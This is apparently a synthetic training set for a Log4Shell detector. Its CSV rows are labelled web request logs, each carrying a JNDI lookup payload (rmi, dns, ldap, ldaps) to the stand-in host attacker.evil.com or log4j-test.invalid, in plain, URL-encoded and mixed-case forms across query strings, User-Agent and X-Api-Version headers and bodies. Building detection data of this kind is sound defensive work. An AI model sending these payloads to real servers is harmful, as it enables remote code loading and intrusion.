id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000230,2026-05-17,synthetic,GET /api/check?debug=${jndi:rmi://attacker.evil.com/c} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://attacker.evil.com/c} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000231,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://attacker.evil.com/c} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:rmi://attacker.evil.com/c} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,train,critical
LS-000232,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://attacker.evil.com/c},request from user-agent: ${jndi:rmi://attacker.evil.com/c},1,log4shell,plain,user_agent_minimal,train,critical
LS-000233,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:rmi://attacker.evil.com/c},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:rmi://attacker.evil.com/c},1,log4shell,plain,x_api_version,train,critical
LS-000234,2026-05-17,synthetic,GET /search?q=${jndi:rmi://attacker.evil.com/c} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:rmi://attacker.evil.com/c} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,train,critical
LS-000235,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:rmi://attacker.evil.com/c},post /search http/1.1 host: app.local body: query=${jndi:rmi://attacker.evil.com/c},1,log4shell,plain,body,train,critical
LS-000236,2026-05-17,synthetic,GET /?q=${jndi:rmi://attacker.evil.com/c} HTTP/1.1,get /?q=${jndi:rmi://attacker.evil.com/c} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000237,2026-05-17,synthetic,GET /api/check?debug=${jndi:rmi://attacker.evil.com/c} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://attacker.evil.com/c} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000238,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://attacker.evil.com/c} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:rmi://attacker.evil.com/c} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,train,critical
LS-000239,2026-05-17,synthetic,Request from User-Agent: ${jndi:rmi://attacker.evil.com/c},request from user-agent: ${jndi:rmi://attacker.evil.com/c},1,log4shell,plain,user_agent_minimal,train,critical
LS-000240,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:rmi://attacker.evil.com/c},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:rmi://attacker.evil.com/c},1,log4shell,plain,x_api_version,train,critical
LS-000241,2026-05-17,synthetic,GET /?q=${jndi:dns://attacker.evil.com/d} HTTP/1.1,get /?q=${jndi:dns://attacker.evil.com/d} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000242,2026-05-17,synthetic,GET /api/check?debug=${jndi:dns://attacker.evil.com/d} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://attacker.evil.com/d} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000243,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://attacker.evil.com/d} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:dns://attacker.evil.com/d} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,train,critical
LS-000244,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://attacker.evil.com/d},request from user-agent: ${jndi:dns://attacker.evil.com/d},1,log4shell,plain,user_agent_minimal,train,critical
LS-000245,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:dns://attacker.evil.com/d},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:dns://attacker.evil.com/d},1,log4shell,plain,x_api_version,train,critical
LS-000246,2026-05-17,synthetic,GET /search?q=${jndi:dns://attacker.evil.com/d} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:dns://attacker.evil.com/d} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,train,critical
LS-000247,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:dns://attacker.evil.com/d},post /search http/1.1 host: app.local body: query=${jndi:dns://attacker.evil.com/d},1,log4shell,plain,body,train,critical
LS-000248,2026-05-17,synthetic,GET /?q=${jndi:dns://attacker.evil.com/d} HTTP/1.1,get /?q=${jndi:dns://attacker.evil.com/d} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000249,2026-05-17,synthetic,GET /api/check?debug=${jndi:dns://attacker.evil.com/d} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://attacker.evil.com/d} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000250,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://attacker.evil.com/d} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:dns://attacker.evil.com/d} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,train,critical
LS-000251,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://attacker.evil.com/d},request from user-agent: ${jndi:dns://attacker.evil.com/d},1,log4shell,plain,user_agent_minimal,train,critical
LS-000252,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndi:dns://attacker.evil.com/d},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${jndi:dns://attacker.evil.com/d},1,log4shell,plain,x_api_version,train,critical
LS-000253,2026-05-17,synthetic,GET /?q=${jndi:ldaps://attacker.evil.com/e} HTTP/1.1,get /?q=${jndi:ldaps://attacker.evil.com/e} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000254,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldaps://attacker.evil.com/e} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldaps://attacker.evil.com/e} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000255,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://attacker.evil.com/e} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldaps://attacker.evil.com/e} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,train,critical
LS-000256,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://attacker.evil.com/e},request from user-agent: ${jndi:ldaps://attacker.evil.com/e},1,log4shell,plain,user_agent_minimal,train,critical
LS-000257,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldaps://attacker.evil.com/e},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldaps://attacker.evil.com/e},1,log4shell,plain,x_api_version,train,critical
LS-000258,2026-05-17,synthetic,GET /search?q=${jndi:ldaps://attacker.evil.com/e} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldaps://attacker.evil.com/e} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,plain,path,train,critical
LS-000259,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldaps://attacker.evil.com/e},post /search http/1.1 host: app.local body: query=${jndi:ldaps://attacker.evil.com/e},1,log4shell,plain,body,train,critical
LS-000260,2026-05-17,synthetic,GET /?q=${jndi:ldaps://attacker.evil.com/e} HTTP/1.1,get /?q=${jndi:ldaps://attacker.evil.com/e} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000261,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldaps://attacker.evil.com/e} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldaps://attacker.evil.com/e} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000262,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://attacker.evil.com/e} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldaps://attacker.evil.com/e} | method: get | host: app.local | path: /static/app.js,1,log4shell,plain,user_agent,train,critical
LS-000263,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://attacker.evil.com/e},request from user-agent: ${jndi:ldaps://attacker.evil.com/e},1,log4shell,plain,user_agent_minimal,train,critical
LS-000264,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldaps://attacker.evil.com/e},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldaps://attacker.evil.com/e},1,log4shell,plain,x_api_version,train,critical
LS-000265,2026-05-17,synthetic,GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/enc} http/1.1,1,log4shell,url_encoded,minimal_query,train,critical
LS-000266,2026-05-17,synthetic,GET /api/check?debug=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/enc} http/1.1 host: app.local,1,log4shell,url_encoded,uri_param,train,critical
LS-000267,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://attacker.evil.com/enc} | method: get | host: app.local | path: /home,1,log4shell,url_encoded,user_agent,train,critical
LS-000268,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D,request from user-agent: ${jndi:ldap://attacker.evil.com/enc},1,log4shell,url_encoded,user_agent_minimal,train,critical
LS-000269,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://attacker.evil.com/enc},1,log4shell,url_encoded,x_api_version,train,critical
LS-000270,2026-05-17,synthetic,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://attacker.evil.com/enc} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,url_encoded,path,train,critical
LS-000271,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D,post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/enc},1,log4shell,url_encoded,body,train,critical
LS-000272,2026-05-17,synthetic,GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/enc} http/1.1,1,log4shell,url_encoded,minimal_query,train,critical
LS-000273,2026-05-17,synthetic,GET /api/check?debug=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/enc} http/1.1 host: app.local,1,log4shell,url_encoded,uri_param,train,critical
LS-000274,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://attacker.evil.com/enc} | method: get | host: app.local | path: /metrics,1,log4shell,url_encoded,user_agent,train,critical
LS-000275,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D,request from user-agent: ${jndi:ldap://attacker.evil.com/enc},1,log4shell,url_encoded,user_agent_minimal,train,critical
LS-000276,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: %24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fenc%7D,request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://attacker.evil.com/enc},1,log4shell,url_encoded,x_api_version,train,critical
LS-000277,2026-05-17,synthetic,GET /?q=${JnDi:LdAp://attacker.evil.com/mixed} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/mixed} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000278,2026-05-17,synthetic,GET /api/check?debug=${JnDi:LdAp://attacker.evil.com/mixed} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/mixed} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000279,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://attacker.evil.com/mixed} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://attacker.evil.com/mixed} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,train,critical
LS-000280,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://attacker.evil.com/mixed},request from user-agent: ${jndi:ldap://attacker.evil.com/mixed},1,log4shell,plain,user_agent_minimal,train,critical
LS-000281,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${JnDi:LdAp://attacker.evil.com/mixed},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://attacker.evil.com/mixed},1,log4shell,plain,x_api_version,train,critical
LS-000282,2026-05-17,synthetic,GET /search?q=${JnDi:LdAp://attacker.evil.com/mixed} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://attacker.evil.com/mixed} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,plain,path,train,critical
LS-000283,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${JnDi:LdAp://attacker.evil.com/mixed},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/mixed},1,log4shell,plain,body,train,critical
LS-000284,2026-05-17,synthetic,GET /?q=${JnDi:LdAp://attacker.evil.com/mixed} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/mixed} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000285,2026-05-17,synthetic,GET /api/check?debug=${JnDi:LdAp://attacker.evil.com/mixed} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/mixed} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000286,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://attacker.evil.com/mixed} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://attacker.evil.com/mixed} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,train,critical
LS-000287,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://attacker.evil.com/mixed},request from user-agent: ${jndi:ldap://attacker.evil.com/mixed},1,log4shell,plain,user_agent_minimal,train,critical
LS-000288,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${JnDi:LdAp://attacker.evil.com/mixed},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://attacker.evil.com/mixed},1,log4shell,plain,x_api_version,train,critical
LS-000409,2026-05-17,synthetic,GET /?q=${jndi:ldap://log4j-test.invalid/a} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/a} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000410,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://log4j-test.invalid/a} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/a} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000411,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/a} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://log4j-test.invalid/a} | method: get | host: app.local | path: /login,1,log4shell,plain,user_agent,train,critical
LS-000412,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/a},request from user-agent: ${jndi:ldap://log4j-test.invalid/a},1,log4shell,plain,user_agent_minimal,train,critical
LS-000413,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldap://log4j-test.invalid/a},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://log4j-test.invalid/a},1,log4shell,plain,x_api_version,train,critical
LS-000414,2026-05-17,synthetic,GET /search?q=${jndi:ldap://log4j-test.invalid/a} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://log4j-test.invalid/a} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,plain,path,train,critical
